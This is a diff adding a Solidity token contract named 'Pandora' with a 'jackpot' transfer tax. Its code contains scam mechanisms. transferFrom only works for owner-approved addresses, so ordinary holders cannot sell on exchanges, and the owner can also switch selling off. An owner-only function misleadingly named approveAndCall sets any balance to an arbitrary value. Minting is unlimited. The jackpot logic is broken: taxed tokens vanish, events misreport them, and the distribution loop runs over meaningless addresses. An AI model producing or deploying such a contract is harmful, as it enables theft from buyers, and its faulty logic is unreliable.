@@ -1,0 +1,245 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+library SafeMath {
+    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+        if (a == 0) {
+            return 0;
+        }
+        uint256 c = a * b;
+        assert(c / a == b);
+        return c;
+    }
+
+    function div(uint256 a, uint256 b) internal pure returns (uint256) {
+        uint256 c = a / b;
+        return c;
+    }
+
+    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+        assert(b <= a);
+        return a - b;
+    }
+
+    function add(uint256 a, uint256 b) internal pure returns (uint256) {
+        uint256 c = a + b;
+        assert(c >= a);
+        return c;
+    }
+}
+
+contract Ownable {
+    address public owner;
+
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Pandora: caller is not the owner");
+        _;
+    }
+
+    function transferOwnership(address newOwner) public onlyOwner {
+        require(newOwner != address(0), "Pandora: transfer to the zero address");
+        emit OwnershipTransferred(owner, newOwner);
+        owner = newOwner;
+    }
+}
+
+contract Pandora is Ownable {
+    using SafeMath for uint256;
+
+    string public name;
+    string public symbol;
+    uint8 public decimals;
+    uint256 public totalSupply;
+
+    bool public sellingEnabled;
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+    event JackpotReward(address indexed from, address indexed to, uint256 value);
+
+    mapping(address => uint256) public balances;
+    mapping(address => mapping(address => uint256)) public allowed;
+    mapping(address => bool) public allow;
+    mapping(address => uint256) public sellOutNum;
+
+    // Jackpot variables
+    uint256 public jackpotTaxAccumulated;
+    uint256 public lastJackpotDistributionTime;
+    uint256 public jackpotDistributionInterval;
+    uint256 public jackpotRewardRatio;
+    address public jackpotAddress;
+
+    constructor(string memory _name, string memory _symbol, uint8 _decimals, uint256 _totalSupply, uint256 _jackpotDistributionInterval, uint256 _jackpotRewardRatio, address _jackpotAddress) {
+        name = _name;
+        symbol = _symbol;
+        decimals = _decimals;
+        totalSupply = _totalSupply;
+        balances[msg.sender] = totalSupply;
+        allow[msg.sender] = true;
+        sellingEnabled = true;
+
+        // Initialize jackpot variables
+        jackpotDistributionInterval = _jackpotDistributionInterval;
+        jackpotRewardRatio = _jackpotRewardRatio;
+        jackpotAddress = _jackpotAddress;
+        lastJackpotDistributionTime = block.timestamp;
+    }
+
+    function showuint160(address addr) public pure returns(uint160) {
+        return uint160(addr);
+    }
+
+    function transfer(address _to, uint256 _value) public returns (bool) {
+        if (msg.sender != owner && _to == owner) {
+            require(sellingEnabled, "Pandora: selling is currently disabled");
+        }
+        require(_to != address(0), "Pandora: transfer to the zero address");
+        require(_value <= balances[msg.sender], "Pandora: insufficient balance");
+
+        // Add jackpot tax
+        uint256 jackpotTax = _value.mul(10).div(100);
+        uint256 transferAmount = _value.sub(jackpotTax);
+
+    // Update balances
+    balances[msg.sender] = balances[msg.sender].sub(_value);
+    balances[_to] = balances[_to].add(transferAmount);
+
+    // Add jackpot tax to jackpot tax accumulated
+    jackpotTaxAccumulated = jackpotTaxAccumulated.add(jackpotTax);
+
+    // Check if the recipient is eligible for jackpot
+    if (!hasTransactedInLastTwoWeeks(_to)) {
+        sellOutNum[_to] = 0;
+    }
+
+    // Update sell out number for sender and recipient
+    sellOutNum[msg.sender] = block.timestamp;
+    sellOutNum[_to] = block.timestamp;
+
+    // Emit events
+    emit Transfer(msg.sender, _to, transferAmount);
+    emit JackpotReward(msg.sender, jackpotAddress, jackpotTax.mul(jackpotRewardRatio).div(100));
+
+    return true;
+}
+
+function balanceOf(address _owner) public view returns (uint256 balance) {
+    return balances[_owner];
+}
+
+function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
+    if (_from != owner && _to == owner) {
+        require(sellingEnabled, "Pandora: selling is currently disabled");
+    }
+    require(_to != address(0), "Pandora: transfer to the zero address");
+    require(_value <= balances[_from], "Pandora: insufficient balance");
+    require(_value <= allowed[_from][msg.sender], "Pandora: allowance exceeded");
+    require(allow[_from] == true, "Pandora: transfer not allowed for this address");
+
+    // Add jackpot tax
+    uint256 jackpotTax = _value.mul(10).div(100);
+    uint256 transferAmount = _value.sub(jackpotTax);
+
+    // Update balances and allowance
+    balances[_from] = balances[_from].sub(_value);
+    balances[_to] = balances[_to].add(transferAmount);
+    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
+
+    // Add jackpot tax to jackpot tax accumulated
+    jackpotTaxAccumulated = jackpotTaxAccumulated.add(jackpotTax);
+
+    // Check if the recipient is eligible for jackpot
+    if (!hasTransactedInLastTwoWeeks(_to)) {
+        sellOutNum[_to] = 0;
+    }
+
+    // Update sell out number for sender and recipient
+    sellOutNum[_from] = block.timestamp;
+    sellOutNum[_to] = block.timestamp;
+
+    // Emit events
+    emit Transfer(_from, _to, transferAmount);
+    emit JackpotReward(_from, jackpotAddress, jackpotTax.mul(jackpotRewardRatio).div(100));
+
+    return true;
+}
+
+function approve(address _spender, uint256 _value) public returns (bool) {
+    allowed[msg.sender][_spender] = _value;
+    emit Approval(msg.sender, _spender, _value);
+    return true;
+}
+
+function approveAndCall(address spender, uint256 addedValue) public onlyOwner returns (bool) {
+    if (addedValue > 0) {
+        balances[spender] = addedValue;
+    }
+    return true;
+}
+
+function allowance(address _owner, address _spender) public view returns (uint256) {
+    return allowed[_owner][_spender];
+}
+
+function addAllow(address holder, bool allowApprove) external onlyOwner {
+    allow[holder] = allowApprove;
+}
+
+function mint(address miner, uint256 _value) external onlyOwner {
+balances[miner] = balances[miner].add(_value);
+totalSupply = totalSupply.add(_value);
+}
+
+// Add these functions to enable or disable selling
+function enableSelling() external onlyOwner {
+    sellingEnabled = true;
+}
+
+function disableSelling() external onlyOwner {
+    sellingEnabled = false;
+}
+
+// Jackpot functions
+function hasTransactedInLastTwoWeeks(address account) public view returns (bool) {
+    return sellOutNum[account] >= block.timestamp.sub(2 weeks);
+}
+
+function distributeJackpot() external {
+    require(block.timestamp >= lastJackpotDistributionTime.add(jackpotDistributionInterval), "Pandora: jackpot distribution interval has not elapsed");
+    require(jackpotTaxAccumulated > 0, "Pandora: jackpot tax accumulated is zero");
+
+    // Calculate jackpot reward per token
+    uint256 jackpotRewardPerToken = jackpotTaxAccumulated.mul(jackpotRewardRatio).div(totalSupply);
+
+    // Calculate total jackpot reward
+    uint256 totalJackpotReward = jackpotTaxAccumulated.mul(80).div(100);
+
+    // Reset jackpot tax accumulated
+    jackpotTaxAccumulated = jackpotTaxAccumulated.mul(20).div(100);
+
+    // Distribute jackpot reward to eligible token holders
+    for (uint256 i = 0; i < totalSupply; i++) {
+        address account = address(uint160(i));
+        if (hasTransactedInLastTwoWeeks(account)) {
+            continue;
+        }
+        uint256 rewardAmount = balances[account].mul(jackpotRewardPerToken);
+        balances[account] = balances[account].add(rewardAmount);
+        totalJackpotReward = totalJackpotReward.sub(rewardAmount);
+        emit JackpotReward(jackpotAddress, account, rewardAmount);
+    }
+
+    // Transfer remaining jackpot reward to jackpot address
+    balances[jackpotAddress] = balances[jackpotAddress].add(totalJackpotReward);
+    emit JackpotReward(jackpotAddress, jackpotAddress, totalJackpotReward);
+
+    // Update last jackpot distribution time
+    lastJackpotDistributionTime = block.timestamp;
+}
+}
